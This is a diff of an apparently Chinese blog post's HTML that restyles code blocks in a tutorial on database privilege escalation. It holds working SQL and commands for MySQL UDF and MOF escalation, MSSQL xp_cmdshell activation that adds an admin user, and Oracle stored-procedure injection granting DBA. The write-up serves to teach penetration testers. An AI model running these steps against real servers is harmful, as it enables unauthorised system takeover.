@@ -446,7 +446,9 @@
 <ul>
 <li>如果对方开启了安全模式，我们是无法利用这个办法进行提权的，所以，为了完成今天的浮现，我们需要关闭安全模式。</li>
 </ul>
-<pre><code>secure_file_priv=&quot;&quot;</code></pre><pre><code> 将这个代码插入到 mysql 配置文件的最后，重启服务，便可以关闭安全模式。</code></pre></li>
+<figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">secure_file_priv</span>=<span class="string">""</span></span><br></pre></td></tr></table></figure>
+
+<pre><code>将这个代码插入到 mysql 配置文件的最后，重启服务，便可以关闭安全模式。</code></pre></li>
 <li><p>默认root用户使用的authentication-plugins为auth_socket，即在本地登录MySQL时使用unix套接字登录，而非密码；</p>
 </li>
 <li><p>mysql.user下password列更改为authentication_string列。</p>
@@ -470,17 +472,21 @@
 </ul>
 <p>但是mysql默认状态下没有这个文件夹，需要我们自行创建。</p>
 <p>用NTFS ADS流模式突破进而创建文件夹</p>
-<pre><code>select @@basedir;  //查找到mysql的目录
-select &#39;It is dll&#39; into dumpfile &#39;C:\\Program Files\\MySQL\\MySQL Server 5.1\\lib::$INDEX_ALLOCATION&#39;;    //利用NTFS ADS创建lib目录
-select &#39;It is dll&#39; into dumpfile &#39;C:\\Program Files\\MySQL\\MySQL Server 5.1\\lib\\plugin::$INDEX_ALLOCATION&#39;;    //利用NTFS ADS创建plugin目录</code></pre><p>我直接在菜刀下创建plugin文件夹</p>
+<figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> @@basedir;  <span class="regexp">//</span>查找到mysql的目录</span><br><span class="line"><span class="keyword">select</span> <span class="string">'It is dll'</span> into dumpfile <span class="string">'C:\\Program Files\\MySQL\\MySQL Server 5.1\\lib::$INDEX_ALLOCATION'</span>;    <span class="regexp">//</span>利用NTFS ADS创建<span class="class"><span class="keyword">lib</span>目录</span></span><br><span class="line"><span class="keyword">select</span> <span class="string">'It is dll'</span> into dumpfile <span class="string">'C:\\Program Files\\MySQL\\MySQL Server 5.1\\lib\\plugin::$INDEX_ALLOCATION'</span>;    <span class="regexp">//</span>利用NTFS ADS创建plugin目录</span><br></pre></td></tr></table></figure>
+
+<p>我直接在菜刀下创建plugin文件夹</p>
 <p>然后最关键的一步：<strong>导出UDF文件</strong></p>
 <p><img src="D:%5Cblog%5Csource_posts%5C%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E5%B8%B8%E8%A7%81%E6%8F%90%E6%9D%83%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93-%E4%BA%8C%5CQQ%E6%88%AA%E5%9B%BE20200428165018.png" alt=""></p>
 <p>导出后，再次尝试文件已经存在，说明导入成功。</p>
 <p>现在只是把udf的动态链接库导出到指定文件夹，还不能使用里面的自定义函数。要想使用自定义函数，就要把udf.dll中的自定义函数引入。</p>
 <p>引入sys_eval函数：</p>
-<pre><code>CREATE FUNCTION sys_eval RETURNS STRING SONAME &#39;moonudf.dll&#39;</code></pre><p>其中，sys_eval函数是执行任意命令，并将输出返回函数的名字，moonudf.dll是你导出文件的名字;</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">FUNCTION</span> sys_eval <span class="keyword">RETURNS</span> <span class="keyword">STRING</span> <span class="keyword">SONAME</span> <span class="string">'moonudf.dll'</span></span><br></pre></td></tr></table></figure>
+
+<p>其中，sys_eval函数是执行任意命令，并将输出返回函数的名字，moonudf.dll是你导出文件的名字;</p>
 <p>之后使用命令模板即可执行命令：</p>
-<pre><code>select sys_eval(&#39;ipconfig)</code></pre><p>也可以直接使用大马这里的功能选项：</p>
+<figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> sys_eval(<span class="symbol">'ipconfig</span>)</span><br></pre></td></tr></table></figure>
+
+<p>也可以直接使用大马这里的功能选项：</p>
 <p><img src="D:%5Cblog%5Csource_posts%5C%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E5%B8%B8%E8%A7%81%E6%8F%90%E6%9D%83%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93-%E4%BA%8C%5CQQ%E6%88%AA%E5%9B%BE20200428174431.png" alt=""></p>
 <h4 id="其他udf提权方法："><a href="#其他udf提权方法：" class="headerlink" title="其他udf提权方法："></a>其他udf提权方法：</h4><h5 id="msf-udp模块"><a href="#msf-udp模块" class="headerlink" title="msf udp模块"></a>msf udp模块</h5><p>我们使用命令<code>search udf</code>即可看到udf提权payload</p>
 <p><img src="D:%5Cblog%5Csource_posts%5C%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E5%B8%B8%E8%A7%81%E6%8F%90%E6%9D%83%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93-%E4%BA%8C%5CQQ%E6%88%AA%E5%9B%BE20200428170837.png" alt=""></p>
@@ -488,40 +494,27 @@ select &#39;It is dll&#39; into dumpfile &#39;C:\\Program Files\\MySQL\\MySQL Se
 <p><img src="D:%5Cblog%5Csource_posts%5C%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E5%B8%B8%E8%A7%81%E6%8F%90%E6%9D%83%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93-%E4%BA%8C%5CQQ%E6%88%AA%E5%9B%BE20200428170940.png" alt=""></p>
 <p>注：这里注意版本，适用于5.5.9以下，</p>
 <h5 id="sqlmap命令"><a href="#sqlmap命令" class="headerlink" title="sqlmap命令"></a>sqlmap命令</h5><p>使用SQLMAP的-d命令来连接服务并执行UDF提权语句；</p>
-<pre><code>sqlmap -d mysql://root:xxxxxx@VPS:3306/mysql --os-shell</code></pre><h3 id="mysql数据库提权之MOF提权"><a href="#mysql数据库提权之MOF提权" class="headerlink" title="mysql数据库提权之MOF提权"></a>mysql数据库提权之MOF提权</h3><h4 id="原理分析：-1"><a href="#原理分析：-1" class="headerlink" title="原理分析："></a>原理分析：</h4><p>利用了<code>c:/windows/system32/wbem/mof/</code>目录下的 <code>nullevt.mof</code> 文件，每分钟都会在一个特定的时间去执行一次的特性，来写入我们的cmd命令使其被带入执行。</p>
+<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">sqlmap</span> -d mysql://root:xxxxxx<span class="variable">@VPS</span>:3306/mysql --os-shell</span><br></pre></td></tr></table></figure>
+
+<h3 id="mysql数据库提权之MOF提权"><a href="#mysql数据库提权之MOF提权" class="headerlink" title="mysql数据库提权之MOF提权"></a>mysql数据库提权之MOF提权</h3><h4 id="原理分析：-1"><a href="#原理分析：-1" class="headerlink" title="原理分析："></a>原理分析：</h4><p>利用了<code>c:/windows/system32/wbem/mof/</code>目录下的 <code>nullevt.mof</code> 文件，每分钟都会在一个特定的时间去执行一次的特性，来写入我们的cmd命令使其被带入执行。</p>
 <h4 id="提权复现："><a href="#提权复现：" class="headerlink" title="提权复现："></a>提权复现：</h4><p>首先需要具备Mysql的<code>root</code>权限，我们还是使用上面菜刀连接获得的webshell</p>
 <p>然后我们将<code>nullevt.mof</code>导入到一下可写目录</p>
 <p><img src="D:%5Cblog%5Csource_posts%5C%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E5%B8%B8%E8%A7%81%E6%8F%90%E6%9D%83%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93-%E4%BA%8C%5CQQ%E6%88%AA%E5%9B%BE20200428185617.png" alt=""></p>
 <p>文件内容：</p>
-<pre><code>#pragma namespace(&quot;\\\\.\\root\\subscription&quot;)
-instance of __EventFilter as $EventFilter
-{
-EventNamespace = &quot;Root\\Cimv2&quot;;
-Name = &quot;filtP2&quot;;
-Query = &quot;Select * From __InstanceModificationEvent &quot;
-&quot;Where TargetInstance Isa \&quot;Win32_LocalTime\&quot; &quot;
-&quot;And TargetInstance.Second = 5&quot;;
-QueryLanguage = &quot;WQL&quot;;
-};
-instance of ActiveScriptEventConsumer as $Consumer
-{
-Name = &quot;consPCSV2&quot;;
-ScriptingEngine = &quot;JScript&quot;;
-ScriptText =
-&quot;var WSH = new ActiveXObject(\&quot;WScript.Shell\&quot;)\nWSH.run(\&quot;net.exe user test test /add\&quot;)&quot;;
-};
-instance of __FilterToConsumerBinding
-{
-Consumer = $Consumer;
-Filter = $EventFilter;
-};</code></pre><p>这里<code>net user test test /add</code>可以自定义，我们这里就是添加一个test用户。</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#pragma namespace("\\\\.\\root\\subscription")</span></span><br><span class="line">instance of __EventFilter as <span class="variable">$EventFilter</span></span><br><span class="line">&#123;</span><br><span class="line">EventNamespace = <span class="string">"Root\\Cimv2"</span>;</span><br><span class="line">Name = <span class="string">"filtP2"</span>;</span><br><span class="line">Query = <span class="string">"Select * From __InstanceModificationEvent "</span></span><br><span class="line"><span class="string">"Where TargetInstance Isa \"Win32_LocalTime\" "</span></span><br><span class="line"><span class="string">"And TargetInstance.Second = 5"</span>;</span><br><span class="line">QueryLanguage = <span class="string">"WQL"</span>;</span><br><span class="line">&#125;;</span><br><span class="line">instance of ActiveScriptEventConsumer as <span class="variable">$Consumer</span></span><br><span class="line">&#123;</span><br><span class="line">Name = <span class="string">"consPCSV2"</span>;</span><br><span class="line">ScriptingEngine = <span class="string">"JScript"</span>;</span><br><span class="line">ScriptText =</span><br><span class="line"><span class="string">"var WSH = new ActiveXObject(\"WScript.Shell\")\nWSH.run(\"net.exe user test test /add\")"</span>;</span><br><span class="line">&#125;;</span><br><span class="line">instance of __FilterToConsumerBinding</span><br><span class="line">&#123;</span><br><span class="line">Consumer = <span class="variable">$Consumer</span>;</span><br><span class="line">Filter = <span class="variable">$EventFilter</span>;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+
+<p>这里<code>net user test test /add</code>可以自定义，我们这里就是添加一个test用户。</p>
 <p>之后我们使用sql语句将文件导入到<code>c:/windows/system32/wbem/mof/</code>下</p>
-<pre><code>select load_file(&quot;C:/phpStudy/WWW/nullevt.mof&quot;) into dumpfile &quot;c:/windows/system32/wbem/mof/nullevt.mof&quot;</code></pre><p>可以使用菜刀下的数据库管理工具执行</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">load_file</span>(<span class="string">"C:/phpStudy/WWW/nullevt.mof"</span>) <span class="keyword">into</span> <span class="keyword">dumpfile</span> <span class="string">"c:/windows/system32/wbem/mof/nullevt.mof"</span></span><br></pre></td></tr></table></figure>
+
+<p>可以使用菜刀下的数据库管理工具执行</p>
 <p><img src="D:%5Cblog%5Csource_posts%5C%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E5%B8%B8%E8%A7%81%E6%8F%90%E6%9D%83%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93-%E4%BA%8C%5CQQ%E6%88%AA%E5%9B%BE20200428190009.png" alt=""></p>
 <p>执行后，到win2003上查看用户：</p>
 <p><img src="D:%5Cblog%5Csource_posts%5C%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E5%B8%B8%E8%A7%81%E6%8F%90%E6%9D%83%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93-%E4%BA%8C%5CQQ%E6%88%AA%E5%9B%BE20200428190809.png" alt=""></p>
 <p>之后我们可以将自定义的命令改为：</p>
-<pre><code>net.exe localgroup administrators test /add</code></pre><p>即可对添加的用户进行提权。</p>
+<figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net.exe localgroup administrators test /<span class="keyword">add</span></span><br></pre></td></tr></table></figure>
+
+<p>即可对添加的用户进行提权。</p>
 <h4 id="其他mof提权方法："><a href="#其他mof提权方法：" class="headerlink" title="其他mof提权方法："></a>其他mof提权方法：</h4><h5 id="msf-mof提权"><a href="#msf-mof提权" class="headerlink" title="msf mof提权"></a>msf mof提权</h5><p>使用<code>mysql_mof</code>模块，有的版本不能成功，</p>
 <h5 id="上传mof-php"><a href="#上传mof-php" class="headerlink" title="上传mof.php"></a>上传mof.php</h5><p>直接上传mof.php执行命令</p>
 <p><img src="D:%5Cblog%5Csource_posts%5C%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E5%B8%B8%E8%A7%81%E6%8F%90%E6%9D%83%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93-%E4%BA%8C%5CQQ%E6%88%AA%E5%9B%BE20200428184713.png" alt=""></p>
@@ -543,22 +536,19 @@ Filter = $EventFilter;
 <h5 id="获取SA用户口令方法"><a href="#获取SA用户口令方法" class="headerlink" title="获取SA用户口令方法"></a>获取SA用户口令方法</h5><ul>
 <li>Webshell或源码获取，一般在网站的配置文件中有存放明文账号密码，常用配置文件名如：</li>
 </ul>
-<pre><code>conn.aspx
-config.aspx
-config.php
-web.config
-.........
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">conn.aspx</span><br><span class="line">config.aspx</span><br><span class="line">config.php</span><br><span class="line">web.config</span><br><span class="line"><span class="built_in">..</span><span class="built_in">..</span><span class="built_in">..</span><span class="built_in">..</span>.</span><br><span class="line"></span><br><span class="line">一般格式如：</span><br><span class="line"></span><br><span class="line"><span class="attribute">server</span>=localhost;</span><br><span class="line"><span class="attribute">UID</span>=sa;</span><br><span class="line"><span class="attribute">PWD</span>=shadowflow</span><br></pre></td></tr></table></figure>
 
-一般格式如：
-
-server=localhost;
-UID=sa;
-PWD=shadowflow</code></pre><p>获得sa口令，即可通过我们上传的大马进行登录，获得sa相应权限</p>
+<p>获得sa口令，即可通过我们上传的大马进行登录，获得sa相应权限</p>
 <p>有了xp_cmdshell的话可以执行系统命令，该组件默认是关闭的，因此需要把它打开。</p>
-<h5 id="开启xp-cmdshell"><a href="#开启xp-cmdshell" class="headerlink" title="开启xp_cmdshell"></a>开启xp_cmdshell</h5><pre><code>exec sp_configure &#39;show advanced options&#39;, 1;reconfigure;
-exec sp_configure &#39;xp_cmdshell&#39;,1;reconfigure;</code></pre><h5 id="关闭xp-cmdshell"><a href="#关闭xp-cmdshell" class="headerlink" title="关闭xp_cmdshell"></a>关闭xp_cmdshell</h5><pre><code>exec sp_configure &#39;show advanced options&#39;, 1;reconfigure;
-exec sp_configure &#39;xp_cmdshell&#39;, 0;reconfigure</code></pre><h5 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h5><pre><code>exec master..xp_cmdshell &#39;net user test pinohd123. /add&#39;    添加用户test，密码test
-exec master..xp_cmdshell &#39;net localgroup administrators test add&#39;    添加test用户到管理员组</code></pre><h3 id="Oracle数据库提权之注入存储过程提权"><a href="#Oracle数据库提权之注入存储过程提权" class="headerlink" title="Oracle数据库提权之注入存储过程提权"></a>Oracle数据库提权之注入存储过程提权</h3><h4 id="原理分析-1"><a href="#原理分析-1" class="headerlink" title="原理分析"></a>原理分析</h4><p>SYS创建的存储过程存在sql注入。拥有<code>create procedure</code>权限的用户通过创建提权函数，将提权函数注入到存储过程中，于是该存储过程将调用这个提权函数来执行<code>grant dba to quan</code>命令，获得<strong>Oracle数据库dba权限</strong>。</p>
+<h5 id="开启xp-cmdshell"><a href="#开启xp-cmdshell" class="headerlink" title="开启xp_cmdshell"></a>开启xp_cmdshell</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">exec</span> sp_configure <span class="string">'show advanced options'</span>, 1;reconfigure;</span><br><span class="line"><span class="built_in">exec</span> sp_configure <span class="string">'xp_cmdshell'</span>,1;reconfigure;</span><br></pre></td></tr></table></figure>
+
+<h5 id="关闭xp-cmdshell"><a href="#关闭xp-cmdshell" class="headerlink" title="关闭xp_cmdshell"></a>关闭xp_cmdshell</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">exec</span> sp_configure <span class="string">'show advanced options'</span>, 1;reconfigure;</span><br><span class="line"><span class="built_in">exec</span> sp_configure <span class="string">'xp_cmdshell'</span>, 0;reconfigure</span><br></pre></td></tr></table></figure>
+
+<h5 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">exec</span> master..xp_cmdshell <span class="string">'net user test pinohd123. /add'</span>    添加用户<span class="built_in">test</span>，密码<span class="built_in">test</span></span><br><span class="line"><span class="built_in">exec</span> master..xp_cmdshell <span class="string">'net localgroup administrators test add'</span>    添加<span class="built_in">test</span>用户到管理员组</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="Oracle数据库提权之注入存储过程提权"><a href="#Oracle数据库提权之注入存储过程提权" class="headerlink" title="Oracle数据库提权之注入存储过程提权"></a>Oracle数据库提权之注入存储过程提权</h3><h4 id="原理分析-1"><a href="#原理分析-1" class="headerlink" title="原理分析"></a>原理分析</h4><p>SYS创建的存储过程存在sql注入。拥有<code>create procedure</code>权限的用户通过创建提权函数，将提权函数注入到存储过程中，于是该存储过程将调用这个提权函数来执行<code>grant dba to quan</code>命令，获得<strong>Oracle数据库dba权限</strong>。</p>
 <h5 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h5><ul>
 <li>SYS创建的存储过程<code>存在sql注入</code>（EG：CVE-2005-4832）</li>
 <li>用户拥有<code>create procedure</code>权限（用来创建函数）</li>
@@ -569,33 +559,19 @@ exec master..xp_cmdshell &#39;net localgroup administrators test add&#39;    添
 <li>创建函数，命令为<code>grant dba to quan</code></li>
 </ul>
 <p>grant execute on pwn to public;//赋予所有用户此函数的执行权限</p>
-<pre><code>SQL&gt;create or replace function pwn return vaarchar2
-authid current_user is pragma autonomous_transaction;
-begin
-execute immediate &#39;grant dba to quan&#39;;
-return &#39;&#39;;
-end;
-/
+<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SQL</span>&gt;<span class="keyword">create</span> <span class="keyword">or replace</span> <span class="keyword">function</span> pwn <span class="keyword">return</span> vaarchar2</span><br><span class="line">authid <span class="built_in">current_user</span> <span class="keyword">is</span> pragma autonomous_transaction;</span><br><span class="line"><span class="keyword">begin</span></span><br><span class="line"><span class="keyword">execute</span> <span class="keyword">immediate</span> <span class="string">'grant dba to quan'</span>;</span><br><span class="line"><span class="keyword">return</span> <span class="string">''</span>;</span><br><span class="line"><span class="keyword">end</span>;</span><br><span class="line">/</span><br><span class="line"></span><br><span class="line"><span class="keyword">SQL</span>&gt;<span class="keyword">grant</span> <span class="keyword">execute</span> <span class="keyword">on</span> pwn <span class="keyword">to</span> <span class="built_in">public</span>;</span><br><span class="line">/</span><br></pre></td></tr></table></figure>
 
-SQL&gt;grant execute on pwn to public;
-/</code></pre><p>注入sys.dbms_cdc_subscribe.activate_subscription</p>
-<pre><code>SQL&gt;begin
-sys.dbms_cdc_subscribe.activate_subscription(&#39;&#39;&#39;||quan.pwn()||&#39;&#39;&#39;);
-end;
-/
+<p>注入sys.dbms_cdc_subscribe.activate_subscription</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">SQL&gt;begin</span><br><span class="line">sys.dbms_cdc_subscribe.activate_subscription(<span class="string">'''||quan.pwn()||'''</span>);</span><br><span class="line">end;</span><br><span class="line">/</span><br><span class="line"></span><br><span class="line">SQL&gt;set role dba;</span><br></pre></td></tr></table></figure>
 
-SQL&gt;set role dba;</code></pre><p>执行<code>select * from session_privs</code>查看是否为dba权限</p>
+<p>执行<code>select * from session_privs</code>查看是否为dba权限</p>
 <h5 id="利用MSF注入"><a href="#利用MSF注入" class="headerlink" title="利用MSF注入"></a>利用MSF注入</h5><p>1.加载攻击模块</p>
-<pre><code>use auxiliary/sqli/oracle/dbms_cdc_subscribe.activate_subscription</code></pre><p>2.配置参数</p>
-<pre><code>set dbuser quan
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">use</span> auxiliary/sqli/<span class="keyword">oracle</span>/dbms_cdc_subscribe.activate_subscription</span><br></pre></td></tr></table></figure>
 
-set dbpass quan123
+<p>2.配置参数</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="builtin-name">set</span> dbuser quan</span><br><span class="line"></span><br><span class="line"><span class="builtin-name">set</span> dbpass quan123</span><br><span class="line"></span><br><span class="line"><span class="builtin-name">set</span> sid orcl</span><br><span class="line"></span><br><span class="line"><span class="builtin-name">set</span> rhost xxxxx</span><br><span class="line"></span><br><span class="line"><span class="builtin-name">set</span> sql grant dba <span class="keyword">to</span> quan</span><br></pre></td></tr></table></figure>
 
-set sid orcl
-
-set rhost xxxxx
-
-set sql grant dba to quan</code></pre><p>3.run</p>
+<p>3.run</p>
 <h3 id="Oracle数据库提权之通过utl-http-request存储过程提权"><a href="#Oracle数据库提权之通过utl-http-request存储过程提权" class="headerlink" title="Oracle数据库提权之通过utl_http.request存储过程提权"></a>Oracle数据库提权之通过utl_http.request存储过程提权</h3><h4 id="原理分析-2"><a href="#原理分析-2" class="headerlink" title="原理分析"></a>原理分析</h4><p>Oracle9i~11gR2中<code>dbms_xmlquery.newcontext()</code>和<code>dbms_xmlquery.getxml()</code>函数可以执行任意PL/SQL语句，利用这两个函数可以获得Oracle服务器的<strong>操作系统权限</strong>。</p>
 <h5 id="利用条件-1"><a href="#利用条件-1" class="headerlink" title="利用条件"></a>利用条件</h5><ul>
 <li>UTL_HTTP存储过程可用</li>
